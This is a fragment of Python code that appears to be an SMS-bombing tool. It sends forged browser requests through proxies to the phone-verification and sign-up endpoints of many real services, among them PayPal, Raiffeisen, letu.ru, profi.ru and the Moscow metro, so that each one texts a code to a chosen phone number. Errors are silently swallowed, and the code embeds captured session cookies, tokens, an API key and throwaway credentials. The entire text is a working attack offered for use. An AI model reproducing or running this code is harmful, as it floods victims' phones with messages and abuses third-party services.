                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user,
                'x-csrf-token': 'jy4wGt5Yf5n2oBeYlSBCj0hpEjlTaVz+2f6jg=',
                'x-requested-with': 'XMLHttpRequest'
            }

            payload = {"/appData/action": "init_phone_confirmation", "/appData/griffinData": "true",
                       "/initiatePhoneConfirmData/phoneCountry": "KZ", "/paypalAccountData/phoneOption": "Mobile",
                       "/paypalAccountData/phoneNumber": number[1:], "/paypalAccountData/phoneCountryCode": "7",
                       "/paypalAccountData/createUpdateReady": False, "/initiatePhoneConfirmData/sendSms": "yes",
                       "/initiatePhoneConfirmData/createUpdateReady": True,
                       "/initiatePhoneConfirmData/phoneNumber": number[1:],
                       "/initiatePhoneConfirmData/phoneCountryCode": "7"}

            requests.post('https://www.paypal.com/KZ/welcome/signup', json=payload, headers=header, proxies=proxy_2)
        except:
            pass
        try:
            header = {
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'content-length': '0',
                'cookie': '_pcl=eW5jY/+J6eIKrg==; old_design=0; is_show_welcome_mechanics=1; _tuid=bfa4749db8e83787741b6d039407f632bf8c7dd1; _space=psk_cl%3A; ab_test=90x10v4%3A1%7Creindexer%3A1%7Cdynamic_yield%3A1%7Cwelcome_mechanics%3A4%7Cdummy%3A10; ab_test_analytics=90x10v4%3A1%7Creindexer%3A1%7Cdynamic_yield%3A1%7Cwelcome_mechanics%3A4%7Cdummy%3A10; ab_test_main_1_1_98=3; _slfs=1667497919016; _slid=6363ffb10ae16ce93d0f54eb; _slsession=22984220-F353-40B5-9A72-0604DF3D4AC9; _slfreq=6347f312d9062ed0380b52dc%3A6347f38c9a3f3b9e90027775%3A1667505121; mindboxDeviceUUID=163d88b7-873b-47e8-8156-0cab2973c9f1; directCrm-session=%7B%22deviceGuid%22%3A%22163d88b7-873b-47e8-8156-0cab2973c9f1%22%7D; _slid_server=6363ffb10ae16ce93d0f54eb',
                'origin': 'https://www.citilink.ru',
                'referer': 'https://www.citilink.ru/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user,
                'x-requested-with': 'XMLHttpRequest'
            }

            requests.post(f'https://www.citilink.ru/registration/confirm/phone/+{number}/', headers=header,
                          proxies=proxy_2)
        except:
            pass
        try:
            header = {
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7',
                'Connection': 'keep-alive',
                'Content-Length': '24',
                'Content-Type': 'application/json',
                'Cookie': 'geo_region_url=www; _ym_uid=16563772911015405951; _ym_d=1656377291; geo_region=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%2C%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%2C%D0%A6%D0%B5%D0%BD%D1%82%D1%80%D0%B0%D0%BB%D1%8C%D0%BD%D1%8B%D0%B9%20%D1%84%D0%B5%D0%B4%D0%B5%D1%80%D0%B0%D0%BB%D1%8C%D0%BD%D1%8B%D0%B9%20%D0%BE%D0%BA%D1%80%D1%83%D0%B3; geo_region_coords=55.755787%2C37.617634; geo_site_region=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%2C%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%2C%D0%A6%D0%B5%D0%BD%D1%82%D1%80%D0%B0%D0%BB%D1%8C%D0%BD%D1%8B%D0%B9%20%D1%84%D0%B5%D0%B4%D0%B5%D1%80%D0%B0%D0%BB%D1%8C%D0%BD%D1%8B%D0%B9%20%D0%BE%D0%BA%D1%80%D1%83%D0%B3; geo_site=www; site_city=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0; site_city_id=2; APPLICATION_CONTEXT_CITY=21; mobile=false; device=pc; _ga=GA1.2.8228657.1662288395; _gid=GA1.2.158704625.1662288395; _gat=1; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2022-09-04%2013%3A46%3A35%7C%7C%7Cep%3Dhttps%3A%2F%2Fraiffeisen.ru%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2022-09-04%2013%3A46%3A35%7C%7C%7Cep%3Dhttps%3A%2F%2Fraiffeisen.ru%2F%7C%7C%7Crf%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F103.0.5060.134%20Safari%2F537.36%20OPR%2F89.0.4447.104; _ym_isad=1; _ym_visorc=w; __zzat129=MDA0dBA=Fz2+aQ==; cfids129=; geo_detect_url=www; geo_detect=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%2C%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%2C%D0%A6%D0%B5%D0%BD%D1%82%D1%80%D0%B0%D0%BB%D1%8C%D0%BD%D1%8B%D0%B9%20%D1%84%D0%B5%D0%B4%D0%B5%D1%80%D0%B0%D0%BB%D1%8C%D0%BD%D1%8B%D0%B9%20%D0%BE%D0%BA%D1%80%D1%83%D0%B3; geo_detect_coords=55.755787%2C37.617634; sbjs_session=pgs%3D5%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.raiffeisen.ru%2Fretail%2Fcards%2Fdebit%2Fcashback-card%2F%23ccform-form',
                'DNT': '1',
                'Host': 'oapi.raiffeisen.ru',
                'Origin': 'https://www.raiffeisen.ru',
                'Referer': 'https://www.raiffeisen.ru/retail/cards/debit/cashback-card/',
                'sec-ch-ua': '"Opera GX";v="89", "Chromium";v="103", "_Not:A-Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-site',
                'User-Agent': user
            }

            payload = {"number": number}

            requests.post('https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code/sms', json=payload,
                          headers=header, proxies=proxy_2)
        except:
            pass
        try:
            num2 = f"+7 ({number[1:4]}) {number[4:7]} - {number[7:9]} - {number[9:]}"

            header = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'content-length': '313',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'cookie': 'city=%D0%A3%D1%84%D0%B0; city_auto=%D0%A3%D1%84%D0%B0; PHPSESSID=ugHRLR16ZdJVadoHoKz3DsoBv7tgcTu3; BITRIX_SM_GUEST_ID=3219922; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A9%2C%22EXPIRE%22%3A1667509140%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; city_checked=true; BITRIX_SM_LAST_VISIT=03.11.2022%2022%3A42%3A44',
                'origin': 'https://madyart.ru',
                'referer': 'https://madyart.ru/reg/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user,
                'x-requested-with': 'XMLHttpRequest'
            }

            payload = {
                'wct_reg_fio': 'Кондратьев',
                'wct_reg_fio2': 'Василий',
                'wct_reg_phone': num2,
                'wct_reg_ch': 'Y',
                'wct_reg_1': '',
                'wct_reg_2': '',
                'wct_reg_3': '1',
                'USER_PHONE': '7',
                'USER_PHONE2': '',
                'LOGIN1': '0322',
                'LOGIN2': '0323',
                'wc_phone_psw': 'Hoho_HO123',
                'wc_phone_psw2': 'Hoho_HO123'
            }

            requests.post('https://madyart.ru/local/aut.php', data=payload, headers=header, proxies=proxy_2)
        except:
            pass
        try:
            num2 = "+7 ({0}{1}{2}) {3}{4}{5}-{6}{7}-{8}{9}".format(*number)

            header = {
                'Accept': 'application/json, text/plain, */*',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'fr-FR,fr',
                'Connection': 'keep-alive',
                'Content-Length': '673',
                'Content-Type': 'application/json;charset=UTF-8',
                'Host': 'admin.growfood.pro',
                'Origin': 'https://growfood.pro',
                'Referer': 'https://growfood.pro/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-site',
                'User-Agent': user
            }

            payload = {"analyticalData": {
                "cookie": {"new_site": "old", "_ga": "GA1.2.2803055798.1667505193", "_ym_uid": "1667505193311447307",
                           "default_city": "msk", "gfab_ninja": "ninja", "gfab_ssr_vs_spa": "spa",
                           "gfab_ssr_vs_spa2": "spa", "gfab_ssr_vs_spa3": "spa", "gfab_popup_test": "empty",
                           "gfab_drinks_price": "empty", "gfab_newgf_new_unauthorized": "empty",
                           "gfab_for-suppliers": "enable-for-suppliers", "last_ga_session_loading_number": "0",
                           "owox_session_id": "2803055798.1667505193_1667505197845", "city_confirmed": "true",
                           "selected_target": "p2",
                           "_efst": "945447c2f000a249a96b6e6b10f462844f3b06628854b34613dea1c11eb93041"}},
                       "client": {"phone": num2, "recaptchaToken": None, "cityId": 2}, "brandId_H": "lY"}

            requests.post('https://admin.growfood.pro/api/personal-cabinet/v1/authentication/send-sms', json=payload,
                          headers=header, proxies=proxy_2)
        except:
            pass
        try:
            num2 = "+7 ({0}{1}{2}) {3}{4}{5}-{6}{7}-{8}{9}".format(*number)

            header = {
                'accept': 'application/json',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'content-type': 'application/json',
                'cookie': 'anonymous_user_cart=; anonymous_user_last_viewed=; anonymous_user_wishlist=; anonymous_user_city=; COOKIE-BEARER=eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJ1NTY2MjU3NjA4OSIsImF1dGhvcml0aWVzIjoiUk9MRV9BTk9OWU1PVVMiLCJzaXRlSWQiOiJzdG9yZU1vYmlsZVJVIiwiaWF0IjoxNjY3NTA1ODIzLCJleHAiOjE2Njc1OTIyMjN9.BSzBym8eES4E80HM7Aejqq5BMzS-3pJNxmW8uSPMssqRBZXe-RHWxoVJ2_x7N_ptG0NW-z73EtvKM4uj7d-AeQ; JSESSIONID=RIVGvSdI6jXgarX8Qdj6bmxpy6Q_.letu-wru-07; language=ru-RU; cityDetected=true; ssaid=a6998a60-5bb2-11ed-a966-139fd8fbcf9d; iap.uid=3460084562364d5c80ba900934b73c9c; mindboxDeviceUUID=163d88b7-873b-47e8-8156-0cab2973c9f1; directCrm-session=%7B%22deviceGuid%22%3A%22163d88b7-873b-47e8-8156-0cab2973c9f1%22%7D; popmechanic_sbjs_migrations=popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1; cityGuessed=true; __tld__=null',
                'referer': 'https://www.letu.ru/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user,
                'x-promo-msg': '8CDHp8P8LUWUlktA6uNgTw'
            }

            requests.get(
                f'https://www.letu.ru/s/api/user/account/v1/verifications/phone?pushSite=storeMobileRU&phone=%2B7+%28{num[1] + num[2] + num[3]}%29+{num[4] + num[5] + num[6]}-{num[7] + num[8]}-{num[9] + num[10]}',
                headers=header, proxies=proxy_2)

            header = {
                'accept': 'application/json',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'content-length': '49',
                'content-type': 'application/json',
                'cookie': 'anonymous_user_cart=; anonymous_user_last_viewed=; anonymous_user_wishlist=; anonymous_user_city=; COOKIE-BEARER=eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJ1NTY2MjU3NjA4OSIsImF1dGhvcml0aWVzIjoiUk9MRV9BTk9OWU1PVVMiLCJzaXRlSWQiOiJzdG9yZU1vYmlsZVJVIiwiaWF0IjoxNjY3NTA1ODIzLCJleHAiOjE2Njc1OTIyMjN9.BSzBym8eES4E80HM7Aejqq5BMzS-3pJNxmW8uSPMssqRBZXe-RHWxoVJ2_x7N_ptG0NW-z73EtvKM4uj7d-AeQ; JSESSIONID=RIVGvSdI6jXgarX8Qdj6bmxpy6Q_.letu-wru-07; language=ru-RU; cityDetected=true; ssaid=a6998a60-5bb2-11ed-a966-139fd8fbcf9d; iap.uid=3460084562364d5c80ba900934b73c9c; mindboxDeviceUUID=163d88b7-873b-47e8-8156-0cab2973c9f1; directCrm-session=%7B%22deviceGuid%22%3A%22163d88b7-873b-47e8-8156-0cab2973c9f1%22%7D; popmechanic_sbjs_migrations=popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1; cityGuessed=true; __tld__=null',
                'origin': 'https://www.letu.ru',
                'referer': 'https://www.letu.ru/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user,
                'x-promo-msg': '8CDHp8P8LUWUlktA6uNgTw'
            }

            payload = {
                "phoneNumber": num2,
                "captcha": ""
            }

            requests.post('https://www.letu.ru/s/api/user/account/v1/confirmations/phone?pushSite=storeMobileRU',
                          json=payload, headers=header, proxies=proxy_2)

        except:
            pass
        try:
            num2 = "+7 ({0}{1}{2}) {3}{4}{5}-{6}{7}-{8}{9}".format(*number)

            header = {
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'bx-ajax': 'true',
                'content-length': '100',
                'content-type': 'application/x-www-form-urlencoded',
                'cookie': 'PHPSESSID=sCKb78l6M2hNjDVIsEtRANBWUitsWymC; BITRIX_SM_SALE_UID=31225761; BITRIX_SM_EVRAZ_CURRENT_LOC_ID=93; BITRIX_SM_EVRAZ_SEND_GEO_LOCATION_REQUEST=Y; BITRIX_SM_EVRAZ_LAST_IP_V2=92.204.175.94; operator=0; authorization=0; BITRIX_SM_EVRAZ_LOC_ID=93; BITRIX_SM_EVRAZ_LOC_CITY_NAME=%D0%A1%D0%B0%D0%BD%D0%BA%D1%82-%D0%9F%D0%B5%D1%82%D0%B5%D1%80%D0%B1%D1%83%D1%80%D0%B3; BITRIX_SM_EVRAZ_CITY=%D0%A1%D0%B0%D0%BD%D0%BA%D1%82-%D0%9F%D0%B5%D1%82%D0%B5%D1%80%D0%B1%D1%83%D1%80%D0%B3; mindboxDeviceUUID=163d88b7-873b-47e8-8156-0cab2973c9f1; directCrm-session=%7B%22deviceGuid%22%3A%22163d88b7-873b-47e8-8156-0cab2973c9f1%22%7D; popmechanic_sbjs_migrations=popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1',
                'origin': 'https://spb.evraz.market',
                'referer': 'https://spb.evraz.market/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user,
                'x-bitrix-csrf-token': '79eb9fa06a250d301c9cdc119acc4a2e'
            }

            payload = {
                'userPhone': num2,
                'captchaCode': '',
                'captchaWord': '',
                'sessid': '79eb9fa06a250d301c9cdc119acc4a2e'
            }

            requests.post(
                'https://spb.evraz.market/bitrix/services/main/ajax.php?action=evraz%3Amain.api.auth.sendsms',
                data=payload, headers=header, proxies=proxy_2)
        except:
            pass
        try:
            num2 = "+7 ({0}{1}{2}) {3}{4}{5} {6}{7}{8}{9}".format(*number)

            header = {
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'content-length': '188',
                'content-type': 'application/x-www-form-urlencoded',
                'cookie': 'gmid=gmid.ver4.AcbHIFuqlw.5hXFNUlJJO6lpsO40ROnr3Ai-fvqJftkblAnzaKQV1wNpjBaUSZ3Ky8LkebG7zZY.lm7xZTMYoYl3U444u1FpRfFx48bjFcZxrLdie8sUen8l9VDdfETPtIef7eY1wegBPFuXaiVJ0ugc29jo2o24Mw.sc3; ucid=xQlNT1fYJWW8JN_FjKHIvg; hasGmid=ver4',
                'origin': 'https://cdns.eu1.gigya.com',
                'referer': 'https://cdns.eu1.gigya.com/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': user
            }

            payload = {
                'phoneNumber': num2,
                'lang': 'ru',
                'APIKey': '4_eXEZkSmgY277qYb5XXqALQ',
                'source': 'showScreenSet',
                'sdk': 'js_latest',
                'authMode': 'cookie',
                'pageURL': 'https://mega.ru/',
                'sdkBuild': '13432',
                'format': 'json'
            }

            requests.post('https://accounts.eu1.gigya.com/accounts.otp.sendCode', data=payload, headers=header,
                          proxies=proxy_2)
        except:
            pass
        try:
            num2 = f"7 {number[1:4]}-{number[4:7]}-{number[7:9]}-{number[9:]}"

            header = {
                'accept': 'application/json',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'content-length': '2168',
                'content-type': 'application/json',
                'cookie': 'city=spb; uid=8ABABAB98EEC626328515E670203D03D; sid=ubq6imNi7I5nXlEoPdADAg==; _gcl_au=1.1.1810282558.1667427483; _ga=GA1.2.648055991.1667427484; tmr_lvid=10a4fa8a9fdf0837aa2f832f43e0c879; tmr_lvidTS=1667427483587; _ym_uid=1667427484751794767; _ym_d=1667427484; st_uid=aecf6f00f48400b66c1f81734929fecf; advcake_track_id=49bca5f7-e704-1a53-a041-5e968b832d6e; advcake_session_id=ff6fe018-2736-375f-542e-f888f3e85acb; _tt_enable_cookie=1; _ttp=c729a64e-7d87-49df-b327-4af15846ef99; geo_city_confirmed=yes; tmr_reqNum=5; _ga_FRVD1KH7N7=GS1.1.1667427483.1.1.1667427967.60.0.0; site_version=desktop; first_hit_url=%2F; prfr_tkn=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiZnVsbCIsInZlcnNpb24iOjEsImlkIjoiMWVkNjE5NTctNjczYy00NzU3LWE4ZDUtYTk0MDg3NDIyN2IzIiwic3RhdHVzIjoidG91Y2hlZCIsInNlc3Npb25JZCI6IjE0OWFlMTRmLWIzOTItNGU4Ny04Zjk5LTVmYzg2YmE4MTY1YiIsImlhdCI6MTY2NzUyMzQ5OCwiZXhwIjoxNjY3NTI0MDk4LCJqdGkiOiIxZWQ2MTk1Ny02NzNjLTQ3NTctYThkNS1hOTQwODc0MjI3YjMifQ.wujVLf14hPECV59EpP00QkGCod8GcxW1eO_YTLVGZ_4; wtfId=1724716-1667523501.134-92.204.175.94-21808; ets=%2F%2C%2C1667523504',
                'origin': 'https://spb.profi.ru',
                'referer': 'https://spb.profi.ru/cabinet/login/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user,
                'x-app-id': 'PROFI',
                'x-new-auth-compatible': '1',
                'x-requested-with': 'XMLHttpRequest',
                'x-wtf-id': '1724716-1667523497.326-92.204.175.94-21808'
            }

            payload = {
                "query": "#prfrtkn:front:674c8b3850056b43f431415d44590346396ce839:30d6b358b6ad046bcc5c510e2159ee8fcfb2c5b9\nquery authStrategyStart($type: AuthStrategyType!, $initialState: AuthStrategyInitialState!) {\n  authStrategyStart(type: $type, initialState: $initialState) {\n    ...AuthStrategyUseResultFragment\n  }\n}\n    fragment AuthStrategyUseResultFragment on AuthStrategyUseResult {\n  strategy {\n    strategyDescriptor\n    stepDescriptor\n    name\n    type\n  }\n  result {\n    __typename\n    ... on AuthStrategyResultRetry {\n      answer {\n        __typename\n        errors {\n          __typename\n          code\n          message\n          param\n        }\n      }\n    }\n    ... on AuthStrategyResultError {\n      answer {\n        __typename\n        errors {\n          __typename\n          code\n          message\n          param\n        }\n      }\n    }\n    ... on AuthStrategyResultSuccess {\n      __typename\n      answer {\n        __typename\n        events {\n          __typename\n          ... on AuthStrategyIAnalyticEvent {\n            type\n          }\n        }\n      }\n      auth {\n        loginUrl\n      }\n      step {\n        __typename\n        stepId\n        title\n        ... on AuthStrategyStepFillPhone {\n          phoneSuggestion\n        }\n        ... on AuthStrategyStepValidateMobileId {\n          phoneNumber\n          resendDelay\n        }\n        ... on AuthStrategyStepValidatePincode {\n          phoneNumber\n          resendDelay\n        }\n        ... on AuthStrategyStepFillUserInfo {\n          requestedFields {\n            __typename\n            fieldId\n            type\n            required\n            suggestedValue\n          }\n        }\n        ... on AuthStrategyStepRequestSocNet {\n          socNetId\n          oAuthStateToken\n          popupUrl\n          windowWidth\n          windowHeight\n        }\n        ... on AuthStrategyStepRequestYandex {\n          appId\n          scopes\n        }\n      }\n    }\n  }\n}",
                "variables": {"type": "phone", "initialState": {"phoneNumber": num2, "defaultOrderCityId": "spb-prfr",
                                                                "currentHost": "https://spb.profi.ru"}}}

            requests.post('https://profi.ru/graphql', json=payload, headers=header, proxies=proxy_2)
        except:
            pass
        try:
            header = {
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'content-length': '164',
                'content-type': 'application/json; charset=UTF-8',
                'cookie': 'route=1667523751.397.1119.234211|4d33fc6b928f7f8ef63e5c30cfa97296; WELCOMESESSID=npilc00ks6r8d33jioj85hdkgu; _user_location=3eaf80b99b78f648b2ef3159af22d67d1551ea0424141f70965891ede650e8e3a%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_user_location%22%3Bi%3A1%3Bs%3A1%3A%221%22%3B%7D; utm=4bbcd7bfd0c9102467242ca243ed5d844d77cb0e29dba11fbac5c81df541132ea%3A2%3A%7Bi%3A0%3Bs%3A3%3A%22utm%22%3Bi%3A1%3Bs%3A96%3A%22%7B%22utm_source%22%3A%22Direct%22%2C%22utm_medium%22%3Anull%2C%22utm_campaign%22%3Anull%2C%22utm_term%22%3Anull%2C%22utm_content%22%3Anull%7D%22%3B%7D; JivoSiteLoaded=1; cf_chl_2=00bf271650faddc; cf_chl_prog=x14; cf_clearance=66f7f85a2bd285f4b8c6b873a9d919d965a2bb05-1667523760-0-150; _customer_id=970273e4df0f1d0b3988550e50021c3446dbfa37abd26fc1ad08f511bc416e9da%3A2%3A%7Bi%3A0%3Bs%3A12%3A%22_customer_id%22%3Bi%3A1%3Bs%3A9%3A%22886775909%22%3B%7D; mindboxDeviceUUID=163d88b7-873b-47e8-8156-0cab2973c9f1; directCrm-session=%7B%22deviceGuid%22%3A%22163d88b7-873b-47e8-8156-0cab2973c9f1%22%7D',
                'origin': 'https://abc.ru',
                'referer': 'https://abc.ru/registration/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user
            }

            payload = {"phone": "+" + number, "country_id": 1, "scenario": "registration",
                       "_csrf": "Z5ef-nmzUVs9ilw9nFdmzh5dp84dS6m7zpcIo-Glwk43-PC2SvhkNA_oZWz3Aij7JhDh9jAa7On23D7uq86oeA=="}

            requests.post('https://abc.ru/clientapi/v1/user/phone-sms/', json=payload, headers=header, proxies=proxy_2)
        except:
            pass
        try:
            num2 = '+7 ({0}) {1}-{2}-{3}'.format(number[1:4], number[4:7], number[7:9], number[9:11])

            header = {
                'accept': 'application/json',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'content-length': '102',
                'content-type': 'application/json',
                'cookie': 'qrator_jsr=1667524522.276.189jw3Ua6j7ldN27-i6hrda4u2c9ra76q6gb76mrc5u35q05e-00; qrator_jsid=1667524522.276.189jw3Ua6j7ldN27-fim6nq6jj3t93fqfhlc7uqqsr7ilrnfe; qrator_ssid=1667524522.885.A5rxWM5wTtJvqRXq-cjsj0ugg8h4m2quh0eeam1f77iar8g66; CUPIS-ReqUrl=eyJtZXRob2QiOiJHRVQiLCJyZWRpcmVjdFVybCI6Imh0dHBzOi8vd2FsbGV0LjFjdXBpcy5ydS9tYWluIn0=; CUPIS-SESSION-ID=b1a1ed8f-f90b-4cb6-b882-eac960c2d08d',
                'origin': 'https://wallet.1cupis.ru',
                'referer': 'https://wallet.1cupis.ru/signup',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user,
                'x-csrf-token': '111d4654-5256-4fdf-ae3d-86737e1e365d'
            }

            payload = {
                "confirm": "on",
                "email": "hrufmdo_23@hotmail.com",
                "password": "Hoho_HO123",
                'phone': num2
            }

            requests.post('https://wallet.1cupis.ru/doSendSms', json=payload, headers=header, proxies=proxy_2)
        except:
            pass
        try:
            header = {
                'accept': 'application/json',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'content-length': '505',
                'content-type': 'application/json',
                'cookie': '.AspNetCore.Culture=c%3Dru%7Cuic%3Dru',
                'origin': 'https://auth.mosmetro.ru',
                'referer': 'https://auth.mosmetro.ru/signin?ReturnUrl=%2Fconnect%2Fauthorize%2Fcallback%3Fclient_id%3Df1dac608-dd35-4717-8cbb-18e2f7a1d522%26redirect_uri%3Dhttps%253A%252F%252Flk.mosmetro.ru%252Fexternal-auth%26response_type%3Dcode%26scope%3Dopenid%2520offline_access%2520nbs.ppa%26code_challenge%3Df3L8XTKxMOIGSvyONKNJ6baxDFWCTaB5uFw_7RU6LP8%26code_challenge_method%3DS256%26nonce%3D638031215106710169.NTFlZmI3NTAtYjZhZS00ZTBlLWIzOWItNzg3ZmQxNzQ1NmVhYzcwMGM1ZTQtNTViMi00ZDE3LTk3NTgtNTEzMThkYTg5YzRi%26state%3Dfc7kxm178qekphufyqkq0k%26ui_locales%3Dru%26acr_values%3Dtheme%253Alight&providers=%5B%0A%20%20%22yandex%22,%0A%20%20%22apple%22,%0A%20%20%22sudir%22,%0A%20%20%22google%22,%0A%20%20%22vkontakte%22,%0A%20%20%22local%22%0A%5D',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user
            }

            payload = {"login": number,
                       "returnUrl": "/connect/authorize/callback?client_id=f1dac608-dd35-4717-8cbb-18e2f7a1d522&redirect_uri=https%3A%2F%2Flk.mosmetro.ru%2Fexternal-auth&response_type=code&scope=openid%20offline_access%20nbs.ppa&code_challenge=f3L8XTKxMOIGSvyONKNJ6baxDFWCTaB5uFw_7RU6LP8&code_challenge_method=S256&nonce=638031215106710169.NTFlZmI3NTAtYjZhZS00ZTBlLWIzOWItNzg3ZmQxNzQ1NmVhYzcwMGM1ZTQtNTViMi00ZDE3LTk3NTgtNTEzMThkYTg5YzRi&state=fc7kxm178qekphufyqkq0k&ui_locales=ru&acr_values=theme%3Alight"}

            requests.post('https://auth.mosmetro.ru/api/auth/login/sms', json=payload, headers=header, proxies=proxy_2)
        except:
            pass
        try:
            num2 = f"+7 ({number[1:4]}) {number[4:7]}-{number[7:]}"

            header = {
                'Accept': 'application/json, text/plain, */*',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'fr-FR,fr',
                'Connection': 'keep-alive',
                'Content-Length': '0',
